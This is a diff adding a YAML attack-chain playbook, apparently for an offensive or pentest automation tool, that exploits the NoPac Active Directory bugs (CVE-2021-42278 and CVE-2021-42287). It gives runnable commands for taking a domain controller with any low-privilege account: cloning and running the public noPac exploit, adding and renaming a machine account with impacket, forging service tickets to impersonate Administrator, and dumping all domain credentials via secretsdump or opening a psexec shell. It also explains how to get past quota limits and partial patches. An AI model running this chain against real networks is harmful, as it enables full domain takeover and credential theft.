@@ -1,0 +1,68 @@
+chain_id: nopac_cve_2021_42278_42287
+title: "AD — NoPac / sAMAccountName spoofing (CVE-2021-42278 + CVE-2021-42287) → DA"
+severity: CRITICAL
+tags: [ad, kerberos, nopac, cve-2021-42278, cve-2021-42287, samaccountname, impacket, privesc]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2021-42278" }
+    - { kind: "CVE-2021-42287" }
+    - { kind: "domain_user_credentials" }
+
+description: |
+  Two paired bugs: 42278 lets you set `sAMAccountName` on a computer
+  object to a value matching a domain controller's account (without
+  the trailing `$`). 42287 means the KDC then issues a TGS targeting
+  the DC for that name. Combined: any unprivileged domain user → SYSTEM
+  on a DC. Pre-Nov-2021 patched DCs vulnerable; many environments
+  still are because the patch needs registry hardening to be effective.
+
+steps:
+  - id: 1
+    title: "Confirm you have a domain user (any low-priv account)"
+    command: |
+      crackmapexec smb DC.DOMAIN -u USER -p 'PASS' -d DOMAIN
+
+  - id: 2
+    title: "Run the public PoC end-to-end"
+    command: |
+      git clone https://github.com/cube0x0/noPac /tmp/nopac
+      cd /tmp/nopac && python3 noPac.py DOMAIN/USER:'PASS' \
+        -dc-ip $DC_IP -shell --impersonate Administrator -use-ldap
+
+  - id: 3
+    title: "Or step-by-step with impacket"
+    command: |
+      impacket-addcomputer -computer-name 'rootctl$' -computer-pass 'Rootctl123!' \
+        -dc-ip $DC_IP DOMAIN/USER:'PASS'
+      impacket-renameMachine -current-name 'rootctl$' -new-name 'DC' \
+        -dc-ip $DC_IP DOMAIN/USER:'PASS'
+      impacket-getTGT -dc-ip $DC_IP DOMAIN/'DC':'Rootctl123!'
+      KRB5CCNAME=DC.ccache impacket-getST -spn 'cifs/DC.DOMAIN' \
+        -impersonate Administrator -dc-ip $DC_IP DOMAIN/'DC':'Rootctl123!'
+
+  - id: 4
+    title: "Use the forged TGS — DCSync"
+    command: |
+      export KRB5CCNAME=Administrator@cifs_DC.DOMAIN@DOMAIN.ccache
+      impacket-secretsdump -k -no-pass DC.DOMAIN
+      # Or shell:
+      impacket-psexec -k -no-pass DC.DOMAIN
+
+common_errors:
+  - error: "addcomputer fails: STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED"
+    solution: |
+      MachineAccountQuota was lowered to 0 by GPO. Reuse an existing
+      computer object you control (write rights on its sAMAccountName)
+      or fall back to Shadow Credentials.
+  - error: "getST fails with KDC_ERR_TGT_REVOKED"
+    solution: |
+      Patch level partially applied — the registry value
+      `PacRequestorEnforcement = 2` blocks the bug even on otherwise
+      vulnerable boxes. Check with `reg query \"HKLM\\System\\CurrentControlSet
+      \\Services\\Kdc\"`.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-42278
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-42287
+  - https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
